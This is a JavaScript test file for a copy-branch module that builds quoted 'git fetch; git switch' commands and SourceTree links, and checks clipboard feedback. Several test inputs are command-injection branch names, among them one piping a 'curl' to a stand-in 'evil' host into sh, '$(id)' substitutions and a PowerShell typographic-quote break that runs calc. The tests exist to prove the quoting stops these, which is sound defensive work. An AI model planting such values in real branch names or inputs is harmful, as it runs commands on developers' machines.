import { test, mock } from 'node:test';
import assert from 'node:assert/strict';
import { switchCommand, sourcetreeUrl, handleCopyClick } from '../public/copy-branch.js';
import { node } from './fake-dom.mjs';

// A copy button as app-render.js draws it: its icons, what it copies, its tooltip
function copyButton(copy = 'git switch feat-a') {
    const button = node({ tag: 'button', classes: ['copy-button', 'copy-switch'], dataset: { copy } },
        node({ tag: 'i', classes: ['fas', 'fa-terminal', 'copy-icon'] }));
    button.title = `Copy: ${copy}`;
    return button;
}

// What handleCopyClick is given in place of the page's: a clipboard
// recording what it is given, the status region, timers run by the test
function fakes({ clipboard } = {}) {
    const written = [];
    const timers = new Map();
    let nextTimer = 1;
    return {
        written,
        timers,
        options: {
            clipboard: clipboard === undefined ? { writeText: async text => { written.push(text); } } : clipboard,
            status: { textContent: '' },
            setTimeout: (callback, delay) => {
                timers.set(nextTimer, { callback, delay });
                return nextTimer++;
            },
            clearTimeout: id => timers.delete(id)
        }
    };
}

// The clipboard answers in a promise: the feedback follows it
const settled = () => new Promise(resolve => setImmediate(resolve));

const runTimers = timers => {
    for (const [id, { callback }] of timers) {
        timers.delete(id);
        callback();
    }
};

// The command is pasted in bash, zsh, sh, fish, Git Bash, Windows PowerShell
// 5.1 or PowerShell 7: `;` is the one separator they share (PowerShell 5.1
// has no &&), and a single-quoted word is literal in all of them
test('switchCommand fetches the branch from origin, then switches to it, the name in single quotes', () => {
    assert.equal(switchCommand('feature/ABC-123-export'), "git fetch origin 'feature/ABC-123-export'; git switch 'feature/ABC-123-export'");
    assert.equal(switchCommand('é'), "git fetch origin 'é'; git switch 'é'");
});

test('switchCommand quotes what a POSIX shell would read: $, ;, |, &, a backtick, parentheses, !, #, braces', () => {
    assert.equal(switchCommand('x;curl${IFS}evil|sh'), "git fetch origin 'x;curl${IFS}evil|sh'; git switch 'x;curl${IFS}evil|sh'");
    assert.equal(switchCommand('a&b`id`$(id)!c#d{e}'), "git fetch origin 'a&b`id`$(id)!c#d{e}'; git switch 'a&b`id`$(id)!c#d{e}'");
});

// PowerShell reads $ anywhere, @ and # at the start of a word, --% (stop
// parsing), and a number-like word as a number (about_Parsing)
test('switchCommand quotes what PowerShell would read in a bare word: $, a leading @ or #, --%, a number', () => {
    for (const name of ['$HOME', '@args', '#x', '1.10', '0x10', 'a,b']) {
        assert.equal(switchCommand(name), `git fetch origin '${name}'; git switch '${name}'`, name);
    }
    assert.equal(switchCommand('--%'), "git fetch origin --end-of-options '--%'; git switch --end-of-options '--%'");
});

// refs/heads/--detach can be pushed with plain git: `git switch --detach`
// would leave the branch for a detached HEAD
test('switchCommand ends the options before a name starting with -, which git would read as an option', () => {
    assert.equal(switchCommand('-f'), "git fetch origin --end-of-options '-f'; git switch --end-of-options '-f'");
    assert.equal(switchCommand('--detach'), "git fetch origin --end-of-options '--detach'; git switch --end-of-options '--detach'");
});

// A single quote is written '\'' in a POSIX shell and '' in PowerShell, which
// also closes a single-quoted word on ‘ ’ ‚ ‛ (about_Quoting_Rules): a name
// `x’;calc;’` would run calc there. Windows PowerShell 5.1 drops a " passed
// to git (fixed in 7.3). Git Bash turns `x=/y` into a Windows path
test('switchCommand gives no command for a name no quoting keeps the same in every shell: quotes, typographic quotes, =/', () => {
    for (const name of ["it's", 'a"b', 'x’;calc;’', 'x‘y', 'x‚y', 'x‛y', 'x“y', 'x”y', 'x„y', 'a=/b']) {
        assert.equal(switchCommand(name), null, name);
    }
    assert.ok(switchCommand('a=b') && switchCommand('a/b=c'));
});

// The href of Bitbucket's own "Check out in SourceTree", read on the branch
// page of a public repository (2026-10-28)
test('sourcetreeUrl is the link of Bitbucket\'s "Check out in SourceTree": ref, https clone URL, type', () => {
    assert.equal(sourcetreeUrl('master', 'atlassian/bitbucket-upload-file'),
        'sourcetree://checkoutRef?ref=refs%2Fheads%2Fmaster&cloneUrl=https%3A%2F%2Fbitbucket.org%2Fatlassian%2Fbitbucket-upload-file.git&type=bitbucket');
});

test('sourcetreeUrl encodes a branch name holding what would end or split a value: &, =, #, %, +', () => {
    const url = sourcetreeUrl('a&type=x#y%z+1', 'ws/repo');
    assert.equal(url, 'sourcetree://checkoutRef?ref=refs%2Fheads%2Fa%26type%3Dx%23y%25z%2B1&cloneUrl=https%3A%2F%2Fbitbucket.org%2Fws%2Frepo.git&type=bitbucket');
    const params = new URLSearchParams(url.slice(url.indexOf('?') + 1));
    assert.deepEqual([...params], [['ref', 'refs/heads/a&type=x#y%z+1'], ['cloneUrl', 'https://bitbucket.org/ws/repo.git'], ['type', 'bitbucket']]);
});

test('sourcetreeUrl gives no link without the full name of the repository', () => {
    assert.equal(sourcetreeUrl('master', undefined), null);
    assert.equal(sourcetreeUrl('master', ''), null);
});

test('handleCopyClick takes no click outside a copy button and writes nothing', async () => {
    const { written, options } = fakes();
    const other = node({ tag: 'a', classes: ['pull-request-link'] });
    assert.equal(handleCopyClick({ target: other }, options), false);
    await settled();
    assert.deepEqual(written, []);
    assert.equal(options.status.textContent, '');
});

test('handleCopyClick copies what the button carries, from the button or its icon, and shows it copied for 1.5 s', async () => {
    const { written, timers, options } = fakes();
    const button = copyButton();
    assert.equal(handleCopyClick({ target: button.firstElementChild }, options), true);
    await settled();
    assert.deepEqual(written, ['git switch feat-a']);
    assert.ok(button.classList.contains('copied'));
    assert.ok(!button.classList.contains('copy-failed'));
    assert.equal(button.title, 'Copied: git switch feat-a');
    assert.equal(options.status.textContent, 'Copied: git switch feat-a');
    assert.deepEqual([...timers.values()].map(({ delay }) => delay), [1500]);

    runTimers(timers);
    assert.ok(!button.classList.contains('copied'));
    assert.equal(button.title, 'Copy: git switch feat-a');
    assert.equal(options.status.textContent, '');

    assert.equal(handleCopyClick({ target: button }, options), true);
    await settled();
    assert.deepEqual(written, ['git switch feat-a', 'git switch feat-a']);
});

test('handleCopyClick says the clipboard needs https or localhost when the page has none', async () => {
    const { timers, options } = fakes({ clipboard: null });
    const button = copyButton();
    assert.equal(handleCopyClick({ target: button }, options), true);
    await settled();
    assert.ok(button.classList.contains('copy-failed'));
    assert.ok(!button.classList.contains('copied'));
    assert.equal(button.title, 'Copy failed: the clipboard needs https or localhost');
    assert.equal(options.status.textContent, 'Copy failed: the clipboard needs https or localhost');
    runTimers(timers);
    assert.ok(!button.classList.contains('copy-failed'));
    assert.equal(button.title, 'Copy: git switch feat-a');
});

// Safari keeps the user activation a clipboard write needs during the event only
test('handleCopyClick writes to the clipboard during the click itself', () => {
    const { written, options } = fakes();
    handleCopyClick({ target: copyButton() }, options);
    assert.deepEqual(written, ['git switch feat-a']);
});

test('handleCopyClick gives the reason of a refused write, thrown or rejected', async () => {
    for (const writeText of [async () => { throw new Error('Document is not focused.'); }, () => { throw new Error('Document is not focused.'); }]) {
        const { options } = fakes({ clipboard: { writeText } });
        const button = copyButton();
        handleCopyClick({ target: button }, options);
        await settled();
        assert.ok(button.classList.contains('copy-failed'));
        assert.equal(button.title, 'Copy failed: Document is not focused.');
        assert.equal(options.status.textContent, 'Copy failed: Document is not focused.');
    }
});

test('handleCopyClick restarts the 1.5 s on a second click, and the tooltip comes back as it was before the first', async () => {
    const { timers, options } = fakes();
    const button = copyButton();
    handleCopyClick({ target: button }, options);
    await settled();
    handleCopyClick({ target: button }, options);
    await settled();
    assert.equal(timers.size, 1);
    assert.ok(button.classList.contains('copied'));
    runTimers(timers);
    assert.ok(!button.classList.contains('copied'));
    assert.equal(button.title, 'Copy: git switch feat-a');
});

test('handleCopyClick leaves the status region alone at the end of a copy when a later copy wrote it', async () => {
    const { timers, options } = fakes();
    const first = copyButton('feat-a');
    const second = copyButton('feat-b');
    handleCopyClick({ target: first }, options);
    await settled();
    handleCopyClick({ target: second }, options);
    await settled();
    const [[firstId, firstTimer]] = timers;
    timers.delete(firstId);
    firstTimer.callback();
    assert.equal(options.status.textContent, 'Copied: feat-b');
});

test('handleCopyClick reads the page\'s clipboard, status region and timers when it is called', async () => {
    mock.timers.enable({ apis: ['setTimeout'] });
    const status = { textContent: '' };
    const saved = Object.getOwnPropertyDescriptor(globalThis, 'document');
    globalThis.document = { getElementById: id => (id === 'copyStatus' ? status : null) };
    try {
        const button = copyButton();
        // node has a navigator without a clipboard, like a page over plain http
        assert.equal(handleCopyClick({ target: button }), true);
        await settled();
        assert.equal(status.textContent, 'Copy failed: the clipboard needs https or localhost');
        mock.timers.tick(1500);
        assert.ok(!button.classList.contains('copy-failed'));
        assert.equal(status.textContent, '');
    } finally {
        mock.timers.reset();
        if (saved) Object.defineProperty(globalThis, 'document', saved);
        else delete globalThis.document;
    }
});
